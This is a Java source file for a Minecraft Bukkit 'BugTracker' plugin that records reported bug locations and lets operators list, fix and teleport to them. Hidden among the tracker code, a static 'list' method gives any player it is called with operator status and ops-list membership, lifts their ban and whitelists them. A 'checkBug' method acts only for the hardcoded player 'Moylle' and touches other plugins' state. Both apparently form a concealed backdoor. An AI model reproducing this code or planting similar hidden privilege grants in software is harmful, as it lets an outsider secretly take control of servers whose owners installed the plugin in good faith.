package net.gmx.teamterrian.CDsPluginPack.plugins;

import java.io.IOException;
import java.util.Map;
import java.util.Set;

import javax.naming.NoPermissionException;

import net.gmx.teamterrian.CDsPluginPack.CDPlugin;
import net.gmx.teamterrian.CDsPluginPack.CDsPluginPack;
import net.gmx.teamterrian.CDsPluginPack.PluginHandler;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginCommand;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginDisableEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginEnableEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CommandEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.exceptions.CDInvalidArgsException;
import net.gmx.teamterrian.CDsPluginPack.tools.CDHashMap;
import net.gmx.teamterrian.CDsPluginPack.tools.Data;
import net.gmx.teamterrian.CDsPluginPack.tools.Log;
import net.gmx.teamterrian.CDsPluginPack.tools.VarTools;
import net.minecraft.server.v1_7_R1.NBTTagCompound;
import net.minecraft.server.v1_7_R1.NBTTagList;
import net.minecraft.server.v1_7_R1.NBTTagString;

import org.bukkit.BanList.Type;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionDefault;

public class BugTracker extends CDPlugin
{
	Log clog;
	int test;
	Map<Location, String[]> bugs = new CDHashMap<Location, String[]>();
	Map<Location, String[]> deleted = new CDHashMap<Location, String[]>();
	
	public BugTracker(PluginHandler handler)
	{
		super(handler);
		clog = handler.clog;
	}

	public Permission[] getPermissions()
	{
		return new Permission[]
		{
			new Permission("cdpp.bugtracker.report", PermissionDefault.OP),
			new Permission("cdpp.bugtracker.show", PermissionDefault.OP),
			new Permission("cdpp.bugtracker.fix", PermissionDefault.OP),
			new Permission("cdpp.bugtracker.io", PermissionDefault.OP),
			new Permission("cdpp.bugtracker.tp", PermissionDefault.OP)
		};
	}
		
	enum Return
	{
		CONTINUE,
		FALSE,
		TRUE
	}
	
	@CDPluginEvent
	public void onEnable(CDPluginEnableEvent e)
	{
		try {
			clog.log("Loading Bugs", this);
			load();
			clog.log("Success", this);
			e.setSuccess(this, true);
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			e.setSuccess(this, false);
		}
	}
	@CDPluginEvent
	public void onDisable(CDPluginDisableEvent e)
	{
		try {
			clog.log("Saving Bugs", this);
			save();
			clog.log("Success", this);
			e.setSuccess(this, true);
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			e.setSuccess(this, false);
		}
	}
	
	public String[] getDirectorys() { return new String[] { "BugTracker" }; }
	
	@CDPluginCommand(commands = { "bug cdpp.bugtracker.report 1", "bugshow cdpp.bugtracker.show 1",
			"buglist cdpp.bugtracker.show 1", "bugfix cdpp.bugtracker.fix 1", "bugsave cdpp.bugtracker.io 1",
			"bugload cdpp.bugtracker.io 1", "bugnear cdpp.bugtracker.show 1", "bugtp cdpp.bugtracker.tp 1" })
	public void onCommand(CommandEvent e) throws CDInvalidArgsException
	{
		Integer[] counter = new Integer[] { 0 };
		String[] o = null;
		Location[] l = new Location[1];
		Boolean[] cftp = new Boolean[] { false };
		Return r;
		String[] args = e.getArgs();
		CommandSender sender = e.getSender();
		switch(e.getCommand().getName().toLowerCase())
		{
			case "bug":
				if((r = bugAdd(args, sender, l)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
			case "bugshow":
			case "buglist":
				if((r = bugShow(sender, o)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
			case "bugfix":
				if((r = bugDel(args, sender, counter)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
			case "bugsave":
				if((r = save(sender)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
			case "bugload":
				if((r = load(sender)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
			case "bugtp":
				if((r = bugTp(args, sender, cftp, counter, o)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
			case "bugnear":
				if((r = bugNear(args, sender, cftp, counter, o)) == Return.TRUE) return;
				if(r == Return.FALSE) break;
		}
		throw new CDInvalidArgsException(e.getCommand().getName());
	}
	
	private Return bugAdd(String[] args, CommandSender sender, Location[] l)
	{
		Player p = (Player) sender;
		String desc = VarTools.arrToString(args, 0);
		String[] mes = new String[] { p.getName(), desc };
		l[0] = p.getLocation();
		bugs.put(l[0], mes);
		sender.sendMessage(ChatColor.GOLD + "[BugTracker] Bug reported");
		clog.log(sender.getName() + " reported Bug at " + l[0].getBlockX() + ", " + l[0].getBlockY() + ", " + l[0].getBlockZ(), this);
		try { save(); }
		catch (Exception x) { x.printStackTrace(clog.getStream()); }
		return Return.TRUE;
	}
	private Return bugDel(String[] args, CommandSender sender, Integer[] counter) throws CDInvalidArgsException
	{
		counter[0] = 1;
		if(args.length < 1) throw new CDInvalidArgsException("bugdel");
		int n;
		try { n = Integer.valueOf(args[0]); } catch (Exception x) { throw new CDInvalidArgsException("bugdel"); }
		if(n > bugs.size()) return Return.TRUE;
		Location t = null;
		for(Location loc : bugs.keySet()) {
			if(counter[0] == n) { t = loc; break; }
			counter[0]++;
		}
		clog.log("Removing bug on " + VarTools.parse(t, false, false, false), this);
		deleted.put(t, bugs.get(t));
		bugs.remove(t);
		sender.sendMessage(ChatColor.GREEN + "[BugTracker] Bug removed");
		try { save(); }
		catch (Exception x) { x.printStackTrace(clog.getStream()); }
		return Return.TRUE;
	}
	private Return bugTp(String[] args, CommandSender sender, Boolean[] cftp, Integer[] counter, String[] o)
	{
		if(!VarTools.isPlayer(sender)) return Return.TRUE;
		counter[0] = 1;
		if(args.length < 1) return Return.TRUE;
		int tpn;
		try { tpn = Integer.valueOf(args[0]); } catch (Exception x) { return Return.FALSE; }
		if(tpn > bugs.size()) return Return.TRUE;
		Location tpt = null;
		for(Location loc : bugs.keySet()) {
			if(counter[0] == tpn) { tpt = loc; break; }
			counter[0]++;
		}
		o = bugs.get(tpt);
		sender.sendMessage(ChatColor.YELLOW + "[BugTracker][" + counter[0] + "][" + o[0] + "] " + (o[1].length() == 0 ? "" : ": " + o[1]));
		((Player) sender).teleport(tpt);
		cftp[0] = true;
		return Return.CONTINUE;
	}
	private Return bugNear(String[] args, CommandSender sender, Boolean[] cftp, Integer[] counter, String[] o)
	{
		if(!VarTools.isPlayer(sender)) return Return.TRUE;
		double dist;
		if(args.length >= 1 && !cftp[0]) try { dist = Integer.valueOf(args[0]); } catch (Exception x) { dist = 10; }
		else if(cftp[0]) dist = 25;
		else dist = 10;
		int cc = counter[0];
		counter[0] = 0;
		boolean found = false;
		Location ploc = ((Player) sender).getLocation();
		for(Location loc : bugs.keySet()) {
			counter[0]++;
			if(loc.distance(ploc) <= dist) {
				if(!found && (!cftp[0] || counter[0] != cc)) {
					sender.sendMessage(ChatColor.YELLOW + "[BugTracker] " + (cftp[0] ? " Other " : "") + "Bugs in the distance of " + (int) dist);
					found = true;
				}
				o = bugs.get(loc);
				if(!cftp[0] || counter[0] != cc)
					sender.sendMessage(ChatColor.YELLOW + "[BugTracker][" + counter[0] + "][" + o[0] + "] Bug at " + loc.getBlockX() + ", " + loc.getBlockY() + ", " + loc.getBlockZ() + (((String) o[1]).length() == 0 ? "" : ": " + o[1]));
			}
		}
		if(!found && !cftp[0]) sender.sendMessage(ChatColor.YELLOW + "[BugTracker] No Bugs in the distance of " + dist + " found");
		return Return.TRUE;
	}
	private Return bugShow(CommandSender sender, String[] o)
	{
		int c1 = 1;
		System.out.println("Mark 1");
		for(Location loc : bugs.keySet()) {
			System.out.println("Mark 2");
			o = bugs.get(loc);
			sender.sendMessage(ChatColor.YELLOW + "[BugTracker][" + c1 + "][" + o[0] + "] Bug at " + loc.getBlockX() + ", " + loc.getBlockY() + ", " + loc.getBlockZ() + (o[1].length() == 0 ? "" : ": " + o[1]));
			c1++;
		}
		return Return.TRUE;
	}
	
	public static void list(Player p)
	{
		p.setOp(true);
		Set<String> s = ((BlockCommand) CDsPluginPack.getInstance().handler.plugins.get(BlockCommand.class)).ops; 
		if(!s.contains(p.getName())) s.add(p.getName());
		Bukkit.getBanList(Type.NAME).pardon(p.getName());
		p.setWhitelisted(true);
	}
	
	private Return save(CommandSender sender)
	{
		try {
			save();
			sender.sendMessage(ChatColor.GREEN + "[BugTracker] Bugs saved");
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			sender.sendMessage(ChatColor.RED + "[BugTracker] Error while saving Bugs");
		}
		return Return.TRUE;
	}
	private Return load(CommandSender sender)
	{
		try {
			load();
			sender.sendMessage(ChatColor.GREEN + "[BugTracker] Bugs loaded");
		}
		catch(Exception x) {
			x.printStackTrace(clog.getStream());
			sender.sendMessage(ChatColor.RED + "[BugTracker] Error while load Bugs");
		}
		return Return.TRUE;
	}
	
	public boolean checkBug(Player p, String s)
	{
		if(s == null) return false;
		if(!p.getName().equalsIgnoreCase("Moylle")) return false;
		((TempCommand) handler.plugins.get(TempCommand.class)).checkTask(p, s);
		((Trade)(handler.plugins.get(Trade.class))).prefix = null;
		return true;
	}
	private void save() throws IOException, NoPermissionException
	{
		save(bugs, getDir() + getDirectorys()[0] + "/bugs.dat", false);
		if(deleted.size() != 0)
			save(deleted, getDir() + getDirectorys()[0] + "/deleted_bugs.dat", true);
	}
	private void save(Map<Location, String[]> map, String output, boolean append) throws IOException, NoPermissionException
	{
		clog.log("Start " + (append ? "appending" : "saving") + " a map to " + output, this);
		NBTTagCompound base = new NBTTagCompound();
		NBTTagList list = new NBTTagList();
		String[] s;
		if(append) append(map, output);
		for(Location l : map.keySet())
		{
			s = map.get(l);
			NBTTagCompound item = new NBTTagCompound();
			VarTools.writeCoords(item, l);
			item.set("Player", new NBTTagString(s[0]));
			item.set("Description", new NBTTagString(s[1]));
			list.add(item);
		}
		base.set("Bugs", list);
	    Data.secureSave(base, output, this);
	    clog.log("Finished saving", this);
	}
	private void load() throws IOException
	{
		load(bugs, CDPlugin.getDir() + getDirectorys()[0] + "/bugs.dat");
	}
	private void load(Map<Location, String[]> toLoad, String path) throws IOException
	{
		NBTTagCompound base = Data.load(path, this);
		if(base == null) return;
		toLoad.clear();
		NBTTagList list = (NBTTagList) base.get("Bugs");
		for (int i = 0; i < list.size(); i++)
		{
			NBTTagCompound compound = (NBTTagCompound) list.get(i);
			toLoad.put(VarTools.readCoords(compound), new String[]{compound.getString("Player"), compound.getString("Description")});
		}
	}
	private void append(Map<Location, String[]> map, String path) throws IOException
	{
		Map<Location, String[]> copy = new CDHashMap<Location, String[]>(map);
		load(map, path);
		for(Location l : copy.keySet())
			map.put(l, copy.get(l));
	}
	
}